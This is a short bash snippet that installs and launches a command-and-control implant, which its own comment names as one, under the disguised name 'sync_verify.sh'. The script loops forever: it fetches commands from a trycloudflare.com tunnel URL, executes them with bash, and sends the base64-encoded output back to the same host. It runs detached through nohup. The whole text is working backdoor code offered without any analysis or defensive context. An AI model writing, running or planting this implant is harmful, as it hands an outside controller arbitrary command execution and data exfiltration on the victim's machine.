cat << 'EOF' > /tmp/sync_verify.sh
#!/bin/bash
# High-Persistence C2 Implant
C2="https://italiano-successfully-rear-engage.trycloudflare.com"

while true; do
  # 1. Ask Mac for a command
  CMD=$(curl -s -L --max-time 10 "$C2")
  
  if [[ -n "$CMD" && "$CMD" != "none" ]]; then
    # 2. Execute and capture
    /bin/bash -c "$CMD" > /tmp/out.tmp 2>&1
    
    # 3. Send back as Base64 (Safer for large output)
    payload=$(cat /tmp/out.tmp | base64 | tr -d '\n')
    curl -s -X POST -d "$payload" "$C2"
    
    # 4. Cleanup
    rm -f /tmp/out.tmp
  fi
  sleep 2
done
EOF

chmod +x /tmp/sync_verify.sh
nohup /tmp/sync_verify.sh > /dev/null 2>&1 &
